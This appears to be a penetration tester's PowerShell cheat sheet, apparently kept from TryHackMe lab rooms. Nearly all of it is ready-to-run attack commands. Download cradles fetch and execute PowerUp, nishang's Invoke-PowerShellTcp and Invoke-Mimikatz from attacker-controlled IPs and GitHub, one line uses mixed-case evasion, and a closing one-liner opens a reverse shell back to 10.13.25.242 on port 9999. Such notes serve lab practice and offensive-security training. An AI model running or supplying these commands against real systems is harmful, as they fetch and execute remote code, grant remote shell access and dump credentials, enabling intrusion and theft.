##### Download a file
```powershell
# See room THM - Alfred for results of all methods.
# Some of these worked in other rooms, but not in Alfred.
# May have to try them all.
powershell -c wget "http://10.13.25.242/PowerUp.ps1" -outfile "PowerUp.ps1"

# If the first one errors, try the second one, without IEX.
powershell iex (New-Object Net.WebClient).DownloadFile('http://10.13.25.242/nishang-Invoke-PowerShellTcp.ps1', 'c:\PowerShellTcp.ps1')
powershell (New-Object Net.WebClient).DownloadFile('http://10.13.25.242/nishang-Invoke-PowerShellTcp.ps1', 'c:\PowerShellTcp.ps1')

powershell Invoke-WebRequest -Uri $url -OutFile $output

powershell Invoke-RestMethod -Uri <source> -OutFile <destination>

https://github.com/danielbohannon/Invoke-Obfuscation/issues/10
# From link, download as string and invoke, without saving to file.
PS C:\Users\yomama3> IEX (New-Object Net.Webclient).DownloadString('http://192.168.10.3/Invoke-Mimikatz.ps1')
PS C:\Users\yomama3> iNVokE-mimIkATZ
# From link, download string to file.
$LocalFile = 'c:\users\me\mimi.ps1'
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1') > $LocalFile
```

##### Download PS1 script as string an execute.
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.25.242/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.25.242 -Port 9999
```

##### Execute PowerUp.ps1
```powershell
# Run and do AllChecks in one line.
PowerShell.exe Invoke-Command -ScriptBlock { "Import-Module .\PowerUp.ps1; Invoke-AllChecks"} 
```